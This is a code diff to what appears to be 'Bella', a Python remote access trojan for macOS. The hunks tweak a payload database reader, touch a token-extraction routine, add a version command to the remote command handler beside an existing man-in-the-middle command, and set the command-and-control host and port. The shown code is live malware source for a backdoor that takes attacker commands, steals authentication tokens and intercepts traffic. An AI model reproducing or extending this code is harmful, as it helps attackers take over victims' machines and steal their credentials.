@@ -138,16 +138,20 @@ def readDB(column, payload=False):
 	#we need the path specified below, because we cant read the helper location from DB without knowing what to read
 	conn = sqlite3.connect('%sbella.db' % get_bella_path()) #will create if doesnt exist
 	c = conn.cursor()
-	if payload:
-		c.execute("SELECT %s FROM payloads WHERE id = 1" % column)
-	else:
-		c.execute("SELECT %s FROM bella WHERE id = %s" % (column, bella_UID))
 	try:
+		if payload:
+			c.execute("SELECT %s FROM payloads WHERE id = 1" % column)
+		else:
+			c.execute("SELECT %s FROM bella WHERE id = %s" % (column, bella_UID))
 		value = c.fetchone()[0]
 		if value == None:
-			return False
+				return False
 	except TypeError as e:
 		return False
+
+	except sqlite3.OperationalError:
+		return False
+
 	return base64.b64decode(value) #DECODES the data that updatedb ENCODES!
 
 ##Debug functions
@@ -1600,7 +1604,6 @@ def tokenForce():
 		send_msg("%sFound already generated token!%s\n%s" % (blue_star, blue_star, token), True)
 		return 1
 	while True: #no token exists, begin blast
-		### sooooo turns out that SIP disables dtrace related things from working ... so this is useless 10.11 and up. will
 		### switch out for chain breaker
 		from Foundation import NSData, NSPropertyListSerialization
 		### CTRLC listener
@@ -2017,6 +2020,9 @@ def bella(*Emma):
 						key = "%s\n" % check
 					send_msg(key, True)
 
+				elif data == "bella_version":
+					send_msg('%sBella Version%s: %s\n' % (underline, endANSI, bella_version), True)
+
 				elif data.startswith("mitm_start"):
 					interface = data.split(":::")[1]
 					cert = data.split(":::")[2]
@@ -2293,6 +2299,7 @@ payload_list = []
 temp_file_list = []
 host = '127.0.0.1' #Command and Control IP (listener will run on)
 port = 4545 #What port Bella will operate over
+bella_version = '1.10'
 
 #### End global variables ####
 if __name__ == '__main__':
